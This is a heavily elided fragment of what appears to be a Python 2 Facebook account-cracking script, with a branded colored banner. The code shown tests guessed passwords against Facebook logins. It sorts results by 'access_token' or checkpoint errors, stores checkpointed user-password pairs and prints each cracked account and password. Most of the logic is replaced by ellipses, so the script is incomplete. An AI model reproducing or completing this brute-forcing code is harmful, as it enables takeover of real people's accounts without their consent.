...
\x1b[1;92m➣ NAME :           💗 TONMOY MAHATO 💗

\x1b[1;91m➣ PGE NAME :  💣 Hide 💣

\x1b[1;93m➣ WHATSAPP NO :   👬 Hide 👬

\x1b[1;95m➣ WARNING :  👉 No call no txt🔫
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://youtube.com/channel/UCaHA6In6RwkH0vc4nlGBoPw')
				...
				if 'www.facebook.com' in q['error_msg']:
					...
					cpb.append(c+user+pass1)
 				    ...
 				    if 'access_token' in q:
 				        ...
 				        print '\x1b[1;92m{Tonmoy100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 				            ...
 				            if 'access_token' in q:
 				                ...
 				                print '\x1b[1;92m{Tonmoy100%💉}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
